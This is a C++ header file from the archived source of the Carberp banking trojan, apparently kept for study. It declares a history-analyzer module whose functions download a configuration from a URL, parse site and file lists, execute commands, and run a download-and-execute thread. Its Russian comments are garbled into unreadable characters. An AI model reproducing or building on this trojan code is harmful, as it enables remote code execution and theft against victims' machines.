/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------
//
//   ������ ������� ������� ��������� ������������� �������� ��������
//   � �������� ������� �� ������ ����������
//
//---------------------------------------------------------------------------

#ifndef HistoryAnalizerH
#define HistoryAnalizerH

//---------------------------------------------------------------------------
#include <windows.h>
#include "Strings.h"



typedef struct THistoryConfig
{
	PCHAR Command1;   // �������� �������. ���������� ���� � �������
					  // ����� ������� ��������� ����-�� ������ ����� �� ������.
					  // � ��������� ������ ���������� �������������� �������
	PCHAR Command2;   // �������������� �������
	PStrings Sites;   // ������ ������� ������
	PStrings Files;   // ������ ������� �� ������ ������������ ������
	bool ContainsURL; // ������� ����, ��� ���� �� ������ ������ � �������
} *PHistoryConfig;


namespace HisAnalizer
{
	//  ��������� ���������������� ���� �����������
	bool Download(PCHAR URL, PHistoryConfig &Config);

	//  ���������� ������ ����������������� �����
	bool Parse(PCHAR Lines, PHistoryConfig Config);

	//  ���������� ������ ������� � ��������� ����������� �������
	void Execute(PHistoryConfig Config);

	//  ��������� � ��������� ������� �� ����������������� �����
    void DownloadAndExecute(PCHAR URL);

	//  �������� ������
	void ClearConfig(PHistoryConfig Config);

	// ���������� ������
    void FreeConfig(PHistoryConfig Config);

    // ��������� �������� � ���������� ����������� ������� � ��������� ������
	void StartAnalizerThread(PCHAR URL);
}


//---------------------------------------------------------------------------
#endif
